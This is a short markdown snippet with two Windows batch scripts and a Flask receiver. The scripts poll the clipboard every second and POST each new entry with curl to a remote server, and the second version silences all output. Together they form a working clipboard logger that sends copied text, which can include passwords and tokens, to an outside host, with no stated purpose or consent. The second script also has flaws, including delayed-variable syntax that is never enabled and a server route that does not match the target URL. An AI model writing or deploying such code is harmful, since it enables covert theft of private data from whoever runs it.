# Sending over HTTP using bat script

**V1**
```cmd
@echo off
set "serverUrl=https://host.com"

:loop
rem Store clipboard content in a temporary file
powershell Get-Clipboard > clipboard.txt

rem Read clipboard content and compare with the last value
for /f "delims=" %%A in (clipboard.txt) do set "newText=%%A"
if not defined newText goto loop
if "%newText%"=="%lastText%" goto loop

rem Update last copied text
set "lastText=%newText%"

rem Send POST request using curl
curl -X POST -H "Content-Type: application/json" -d "{\"text\":\"%newText%\"}" %serverUrl%

rem Wait and loop again
timeout /t 1 /nobreak >nul
goto loop
```

---

**V2**

```cmd
@echo off
set "serverUrl=https://host.com"

:loop
rem Store clipboard content in a temporary filec
powershell -Command "Get-Clipboard | Out-String" > clipboard.txt

rem Read clipboard content and compare with the last value
set "newText="
for /f "delims=" %%A in (clipboard.txt) do set "newText=!newText!%%A\n"

if not defined newText goto loop
if "%newText%"=="%lastText%" goto loop

rem Update last copied text
set "lastText=%newText%"

rem Send POST request using curl
curl -s -X POST -H "Content-Type: application/json" -d "{\"text\":\"%newText%\"}" %serverUrl% >nul 2>&1

rem Wait and loop again
timeout /t 1 /nobreak >nul
goto loop
```

---

**Parsing V2 on server**
```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/endpoint', methods=['POST'])
def receive_clipboard():
    data = request.get_json()
    if data and 'text' in data:
        clipboard_text = data['text']
        clipboard_text = clipboard_text.replace("\\n", "\n")  # Convert back to actual newlines
        print("Received clipboard content:\n", clipboard_text)
        return jsonify({"status": "success"}), 200
    return jsonify({"error": "Invalid data"}), 400

if __name__ == "__main__":
    app.run(debug=True)
```
